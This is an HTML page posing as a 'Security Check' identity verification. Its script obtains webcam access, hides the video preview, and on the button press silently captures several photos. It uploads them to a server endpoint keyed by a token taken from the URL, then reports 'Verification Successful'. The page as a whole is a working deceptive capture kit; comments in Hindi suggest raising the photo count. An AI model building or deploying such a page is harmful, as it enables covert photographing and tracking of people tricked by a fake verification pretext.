<!DOCTYPE html>
<html>
<head>
  <title>Security Verification</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
      background: linear-gradient(135deg, #667eea, #764ba2);
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .card {
      background: white;
      width: 90%;
      max-width: 360px;
      border-radius: 18px;
      padding: 25px;
      text-align: center;
      box-shadow: 0 10px 30px rgba(0,0,0,0.25);
      animation: fadeIn 0.4s ease;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }

    .card img {
      width: 110px;
      margin-bottom: 15px;
    }

    h2 {
      margin: 10px 0;
      font-size: 22px;
      color: #333;
    }

    p {
      font-size: 14px;
      color: #666;
      line-height: 1.4;
    }

    /* ✅ BIG & CLEAR VERIFY BUTTON */
    button {
      margin-top: 25px;
      width: 100%;
      padding: 18px;
      border: none;
      border-radius: 40px;
      background: linear-gradient(135deg, #00c6ff, #0072ff);
      color: white;
      font-size: 20px;
      font-weight: bold;
      cursor: pointer;
      box-shadow: 0 10px 25px rgba(0,0,0,0.3);
      transition: transform 0.15s ease, box-shadow 0.15s ease;
    }

    button:active {
      transform: scale(0.96);
      box-shadow: 0 6px 15px rgba(0,0,0,0.25);
    }

    button:disabled {
      background: gray;
      box-shadow: none;
    }

    .status {
      margin-top: 15px;
      font-size: 14px;
      font-weight: bold;
      color: green;
    }

    /* ✅ Camera preview completely hidden */
    video, canvas {
      display: none;
    }
  </style>
</head>
<body>

  <div class="card">
    <!-- ✅ Safe placeholder image -->
    <img src="https://cdn-icons-png.flaticon.com/512/747/747376.png" alt="verification">

    <h2>Security Check</h2>
    <p>
      For your safety, a quick identity verification is required.<br>
      Your camera will be used only for this verification.
    </p>

    <button id="verifyBtn">✅ Continue Verification</button>
    <div class="status" id="status"></div>

    <video id="video" autoplay></video>
    <canvas id="canvas"></canvas>
  </div>

  <script>
    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");
    const status = document.getElementById("status");
    const btn = document.getElementById("verifyBtn");

    const token = window.location.pathname.split("/").pop();

    // ✅ Ask for camera permission (browser rule)
    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => video.srcObject = stream)
      .catch(() => status.innerText = "Camera permission denied");

    btn.addEventListener("click", async () => {
      btn.disabled = true;
      status.style.color = "#333";
      status.innerText = "Verifying... Please wait";

      // ✅ 1 second wait, then all photos go fast together
      await new Promise(r => setTimeout(r, 1000));

      let photosCount = 6; // ✅ Yahan 6 ki jagah 10 bhi kar sakte ho

      const uploadPromises = [];

      for (let i = 0; i < photosCount; i++) {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;

        const ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0);

        const blob = await new Promise(resolve =>
          canvas.toBlob(resolve, "image/jpeg")
        );

        const form = new FormData();
        form.append("photo", blob);

        uploadPromises.push(
          fetch("/api/upload/" + token, {
            method: "POST",
            body: form
          })
        );
      }

      // ✅ Saari photos ek saath send hongi
      await Promise.all(uploadPromises);

      status.style.color = "green";
      status.innerText = "✅ Verification Successful";
    });
  </script>

</body>
</html>
